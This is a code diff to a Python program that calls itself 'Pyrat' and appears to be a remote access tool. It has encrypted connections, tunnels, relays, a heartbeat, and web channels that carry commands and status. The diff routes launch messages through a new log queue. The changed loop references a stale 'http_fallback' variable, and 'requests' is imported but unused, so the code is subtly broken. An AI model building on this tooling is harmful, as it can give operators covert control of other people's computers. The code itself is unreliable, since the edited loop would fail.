@@ -6,6 +6,7 @@ from utils.Relay import PacketRelay
 from utils.Tunnel import Tunnel, Mode as TunnelMode
 from utils.FileManager import FileManager
 from utils.Macros import Macros
+from web.WebLogQueue import WebLogQueue
 import subprocess
 import time
 import traceback
@@ -27,6 +28,7 @@ import datetime
 from utils.GitInfo import get_latest_commit_info
 import tarfile
 import tempfile
+import requests
 
 REP_INVALID = 0xFE
 OPT_QUIT = 0xFF
@@ -68,6 +70,7 @@ _tunnels = []
 _file_manager = FileManager()
 _relays = []
 _http_fallbacks = []
+_web_log = []
 
 _selected_socket = None
 
@@ -812,6 +815,7 @@ class ConnectionMonitorThread(threading.Thread):
                     encrypted_socket.settimeout(300)
 
                     if not encrypted_socket.connectAsServer(self.host, self.port, 900):
+                        time.sleep(10)
                         continue
 
                     encrypted_socket.settimeout(None)
@@ -1283,10 +1287,12 @@ def main():
         channel = http_fallback[1]
         status_channel = http_fallback[2]
         print(f"Initialising http fallback monitor: {url} : {channel}")
-        wcp = WebCommandParser(url, channel, enc_keys, status_channel)
+        wl = WebLogQueue(url, status_channel)
+        wcp = WebCommandParser(url, channel, enc_keys, wl)
         wcp.start()
         wcp.set_callback(webCommandParserCallback)
         _http_fallbacks.append(wcp)
+        _web_log.append(wl)
         
     if _tunnel_mode == 'local':
         while len(_socket_threads) == 0:
@@ -1305,11 +1311,10 @@ def main():
             _heart_beat_thread = HeartBeatThread(hb_parts[0], hb_parts[1], enc_keys)
             _heart_beat_thread.start()
 
-        for http_fallback in _http_fallbacks:
+        for wl in _web_log:
             current_datetime = datetime.datetime.now()
             formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
-            while not set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, "Pyrat launched: " + formatted_datetime):
-                time.sleep(5)
+            wl.log(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, "Pyrat launched: " + formatted_datetime)
 
         con_thread.join()
 
